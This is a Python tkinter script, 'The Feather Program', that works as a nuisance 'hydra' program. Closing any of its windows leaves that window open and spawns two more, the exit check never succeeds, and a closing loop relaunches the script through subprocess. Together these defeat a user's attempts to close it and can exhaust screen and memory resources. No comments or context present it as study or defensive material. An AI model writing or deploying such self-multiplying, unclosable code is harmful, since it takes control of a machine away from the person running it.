import tkinter as tk
import subprocess
import sys

class MainApp:
    def __init__(self, root):
        self.root = root
        self.root.withdraw()  # Hide the main window initially
        self.open_new_windows()  # Open two initial new windows

    def open_new_windows(self):
        # Create two new main windows
        for _ in range(2):
            new_window = tk.Toplevel(self.root)
            new_window.title("The Feather Program")
            new_window.geometry("300x200")
            
            # Add a label with text
            label = tk.Label(new_window, text="Welcome to Feather")
            label.pack(pady=20)
            
            # Bind the close event to reopen two windows
            new_window.protocol("WM_DELETE_WINDOW", self.on_new_window_close)

    def on_new_window_close(self):
        # Open two new windows
        self.open_new_windows()
        # Check if there are any windows left open
        if not self.has_open_windows():
            self.root.quit()  # Exit the application if no windows are left

    def has_open_windows(self):
        # Return True if there are any Toplevel windows open
        return any(w.winfo_exists() for w in self.root.winfo_children() if isinstance(w, tk.Toplevel))

# Create the main Tk window
root = tk.Tk()
app = MainApp(root)

# Start the Tkinter main loop
root.mainloop()

def restart_program():
    script = sys.argv[0]
    subprocess.Popen([sys.executable, script] + sys.argv[1:])
    sys.exit()

while True:
    restart_program()
